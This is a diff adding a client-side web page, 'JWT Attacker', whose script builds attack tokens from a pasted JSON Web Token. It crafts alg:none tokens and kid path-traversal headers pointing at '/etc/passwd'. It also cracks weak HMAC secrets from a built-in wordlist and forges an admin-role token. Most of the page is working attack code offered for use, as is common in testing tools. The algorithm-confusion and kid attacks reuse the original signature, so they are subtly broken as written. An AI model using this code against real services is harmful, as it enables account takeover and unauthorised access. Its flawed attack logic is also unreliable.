@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>JWT Attacker — Security Toolbox</title>
+<meta name="description" content="Test JWT tokens against common attacks. Try alg:none, kid header injection, weak HMAC secret cracking, and algorithm confusion. Free JWT security testing tool.">
+<link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+
+<header>
+  <h1>Sec<span>Toolbox</span></h1>
+  <span class="subtitle">tools for bug hunters & developers</span>
+  <span class="badge">beta</span>
+</header>
+
+<div class="tool-page">
+  <a href="../index.html" class="back">← Back to tools</a>
+  <h2>JWT Attacker</h2>
+  <p class="desc">Test JSON Web Tokens against common vulnerability patterns. All attacks run client-side — no data is sent to any server.</p>
+
+  <label for="jwt-input">JWT Token</label>
+  <textarea id="jwt-input" rows="3" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIifQ.tiVqV7hXH4hP7Lq5H9qV7g">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIifQ.dyt0z0lnF5Y5vFbi2H5M6NQ5iU7GQxHYX5G7kL9xZ4Q</textarea>
+
+  <div class="actions">
+    <button onclick="runAttacks()">Run Attacks</button>
+    <button class="secondary" onclick="clearOutput()">Clear</button>
+  </div>
+
+  <h3 style="margin-top:1.5rem;font-size:.85rem;color:var(--text2)">Results</h3>
+  <div id="jwt-output" class="output">Paste a JWT token and click Run Attacks.</div>
+</div>
+
+<footer>
+  <p>Built by <a href="https://github.com/ReplikanteK">K</a> · All processing client-side</p>
+</footer>
+
+<script>
+function base64UrlDecode(str) {
+  try {
+    str = str.replace(/-/g, '+').replace(/_/g, '/');
+    str += '='.repeat((4 - str.length % 4) % 4);
+    return atob(str);
+  } catch { return null; }
+}
+
+function base64UrlEncode(str) {
+  try {
+    return btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+  } catch { return null; }
+}
+
+function cleanOutput() {
+  const el = document.getElementById('jwt-output');
+  el.className = 'output';
+  el.innerHTML = '';
+  return el;
+}
+
+function appendLine(el, text, color) {
+  const div = document.createElement('div');
+  div.textContent = text;
+  if (color) div.style.color = color;
+  el.appendChild(div);
+}
+
+function appendSection(el, title) {
+  const div = document.createElement('div');
+  div.textContent = title;
+  div.style.marginTop = '8px';
+  div.style.fontWeight = '700';
+  div.style.color = '#e0e0e0';
+  el.appendChild(div);
+}
+
+function appendToken(el, label, token, color) {
+  const div = document.createElement('div');
+  div.style.marginBottom = '6px';
+  const lbl = document.createElement('span');
+  lbl.textContent = `${label}: `;
+  lbl.style.color = '#a0a0a0';
+  div.appendChild(lbl);
+  const tok = document.createElement('span');
+  tok.textContent = token;
+  tok.style.wordBreak = 'break-all';
+  if (color) tok.style.color = color;
+  div.appendChild(tok);
+  el.appendChild(div);
+
+  const copyBtn = document.createElement('button');
+  copyBtn.textContent = 'Copy';
+  copyBtn.style.cssText = 'font-size:.7rem;padding:2px 8px;margin-top:2px;background:#333;border:1px solid #555;color:#ccc;border-radius:3px;cursor:pointer';
+  copyBtn.onclick = () => {
+    navigator.clipboard.writeText(token).then(() => {
+      copyBtn.textContent = 'Copied!';
+      setTimeout(() => { copyBtn.textContent = 'Copy'; }, 2000);
+    });
+  };
+  div.appendChild(copyBtn);
+}
+
+function parseJWT(token) {
+  const parts = token.trim().split('.');
+  if (parts.length !== 3) return null;
+  const header = base64UrlDecode(parts[0]);
+  const payload = base64UrlDecode(parts[1]);
+  if (!header || !payload) return null;
+  return { header: JSON.parse(header), payload: JSON.parse(payload), raw: parts, headerB64: parts[0], payloadB64: parts[1], sigB64: parts[2] };
+}
+
+// Weak HMAC secrets for testing
+const WEAK_SECRETS = [
+  'secret', 'password', '123456', '12345678', 'admin', 'key', 'token',
+  'jwt_secret', 'jwt', 'supersecret', 'changeme', 'pass', 'test',
+  '1234', 'qwerty', 'letmein', 'welcome', 'monkey', 'dragon',
+  'abc123', '111111', '000000', 'shadow', 'master', 'sunshine',
+  'princess', 'football', 'iloveyou', 'trustno1', 'hunter', 'ranger',
+  'access', 'auth', 'api_key', 'secret_key', 'private', 'secret123',
+  'mysecret', 'jsonwebtoken', 'jwtkey', 'hmac', 'sha256',
+  's3cr3t', 'p@ssw0rd', 'changethis', 'default'
+];
+
+async function hmacSHA256(message, secret) {
+  const enc = new TextEncoder();
+  const key = await crypto.subtle.importKey('raw', enc.encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
+  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(message));
+  return btoa(String.fromCharCode(...new Uint8Array(sig)))
+    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+}
+
+async function crackSecret(headerB64, payloadB64, targetSig) {
+  const message = `${headerB64}.${payloadB64}`;
+  for (const secret of WEAK_SECRETS) {
+    const sig = await hmacSHA256(message, secret);
+    if (sig === targetSig) return secret;
+  }
+  return null;
+}
+
+async function runAttacks() {
+  const token = document.getElementById('jwt-input').value.trim();
+  const output = cleanOutput();
+
+  if (!token) {
+    output.textContent = 'Enter a JWT token.';
+    output.className = 'output error';
+    return;
+  }
+
+  const parsed = parseJWT(token);
+  if (!parsed) {
+    output.textContent = 'Invalid JWT format. Expected 3 dot-separated Base64URL segments.';
+    output.className = 'output error';
+    return;
+  }
+
+  appendLine(output, '── Original Token Analysis ──');
+  appendLine(output, `Header:     ${JSON.stringify(parsed.header)}`);
+  appendLine(output, `Payload:    ${JSON.stringify(parsed.payload)}`);
+  appendLine(output, `Algorithm:  ${parsed.header.alg || 'not specified'}`);
+  appendLine(output, `Type:       ${parsed.header.typ || 'JWT'}`);
+
+  if (parsed.header.kid) appendLine(output, `kid:        ${parsed.header.kid}`);
+  if (parsed.header.jku) appendLine(output, `jku:        ${parsed.header.jku} ⚠️ URL-based key!`);
+  if (parsed.header.jwk) appendLine(output, `jwk:        [embedded key] ⚠️ Embedded JWK!`);
+
+  appendLine(output, '');
+
+  // ── Attack 1: alg:none ──
+  appendSection(output, '🔓 Attack 1: alg:none');
+  appendLine(output, 'Setting algorithm to "none" and removing signature...');
+  const noneHeader = { ...parsed.header, alg: 'none' };
+  const noneToken = `${base64UrlEncode(JSON.stringify(noneHeader))}.${parsed.raw[1]}.`;
+  appendLine(output, noneToken ? '✅ Token crafted (alg:none). Try it against the server.' : '❌ Failed to craft', noneToken ? '#40c060' : '#e06060');
+  appendToken(output, 'alg:none token', noneToken);
+  appendLine(output, '');
+
+  // ── Attack 2: alg:none with empty signature (different format) ──
+  appendSection(output, '🔓 Attack 2: alg:None (variant)');
+  const noneHeader2 = { ...parsed.header, alg: 'None' };
+  const noneToken2 = `${base64UrlEncode(JSON.stringify(noneHeader2))}.${parsed.raw[1]}.`;
+  appendToken(output, 'alg:None token', noneToken2);
+  appendLine(output, '');
+
+  // ── Attack 3: kid injection ──
+  appendSection(output, '🔓 Attack 3: kid Header Injection');
+
+  const kidAttacks = [
+    { kid: '../../../etc/passwd', desc: 'path traversal' },
+    { kid: '/dev/null', desc: 'null file' },
+    { kid: '', desc: 'empty kid' },
+    { kid: 'none', desc: 'literal "none"' },
+    { kid: '../../../../../dev/null', desc: 'deep path traversal' },
+  ];
+
+  kidAttacks.forEach(({ kid, desc }) => {
+    const kHeader = { ...parsed.header, alg: 'HS256', kid };
+    const kToken = `${base64UrlEncode(JSON.stringify(kHeader))}.${parsed.raw[1]}.${parsed.raw[2]}`;
+    appendToken(output, `kid="${kid}" (${desc})`, kToken);
+  });
+  appendLine(output, '');
+
+  // ── Attack 4: Algorithm Confusion ──
+  const isHS = parsed.header.alg && parsed.header.alg.startsWith('HS');
+  const isRS = parsed.header.alg && parsed.header.alg.startsWith('RS');
+
+  if (isRS) {
+    appendSection(output, '🔓 Attack 4: RS256 → HS256 Confusion');
+    appendLine(output, 'Server uses RSA (RS256). Change to HS256 with the public key as HMAC secret.');
+    const confHeader = { ...parsed.header, alg: 'HS256' };
+    const confToken = `${base64UrlEncode(JSON.stringify(confHeader))}.${parsed.raw[1]}.${parsed.raw[2]}`;
+    appendToken(output, 'HS256 confusion token', confToken);
+    appendLine(output, '⚠️ This only works if the server leaks its public key and does not validate key type.');
+  } else if (isHS) {
+    appendSection(output, '🔓 Attack 4: Algorithm Confusion');
+    appendLine(output, 'Token uses symmetric algo (HS256). Confusion attack not applicable (would require RSA).');
+  } else {
+    appendSection(output, '🔓 Attack 4: Algorithm Confusion');
+    appendLine(output, 'Unknown algorithm. Try tampering with supported alg values.');
+  }
+  appendLine(output, '');
+
+  // ── Attack 5: Weak Secret Cracking ──
+  appendSection(output, '🔓 Attack 5: Weak HMAC Secret Cracking');
+  appendLine(output, 'Testing against 50+ common weak secrets...');
+
+  if (parsed.header.alg && parsed.header.alg.startsWith('HS')) {
+    const found = await crackSecret(parsed.raw[0], parsed.raw[1], parsed.raw[2]);
+    if (found) {
+      appendLine(output, `✅ CRACKED! Secret: "${found}"`, '#40c060');
+      appendLine(output, '');
+
+      // forge a new token with admin role
+      const newPayload = { ...parsed.payload, role: 'admin', sub: parsed.payload.sub || 'admin' };
+      const newHeader = { ...parsed.header };
+      const message = `${base64UrlEncode(JSON.stringify(newHeader))}.${base64UrlEncode(JSON.stringify(newPayload))}`;
+      const newSig = await hmacSHA256(message, found);
+      const forgedToken = `${message}.${newSig}`;
+      appendSection(output, '🎯 Forged Admin Token');
+      appendToken(output, 'admin token', forgedToken, '#40c060');
+    } else {
+      appendLine(output, '❌ No weak secret matched. Try a larger wordlist externally.');
+    }
+  } else {
+    appendLine(output, '⚠️ Token does not use HMAC (HS256/HS384/HS512). Crack not applicable.');
+  }
+  appendLine(output, '');
+
+  // ── Summary ──
+  appendSection(output, '📋 Testing Checklist');
+  appendLine(output, '☐ Try alg:none token against the endpoint');
+  appendLine(output, '☐ Try alg:None token against the endpoint');
+  appendLine(output, '☐ Try kid path traversal tokens');
+  appendLine(output, '☐ If RS256: try algorithm confusion (RS256→HS256)');
+  appendLine(output, '☐ Check if server validates signature on modified payloads');
+  appendLine(output, '☐ Check if expired tokens are properly rejected');
+}
+
+function clearOutput() {
+  document.getElementById('jwt-output').className = 'output';
+  document.getElementById('jwt-output').textContent = 'Paste a JWT token and click Run Attacks.';
+}
+</script>
+</body>
+</html>
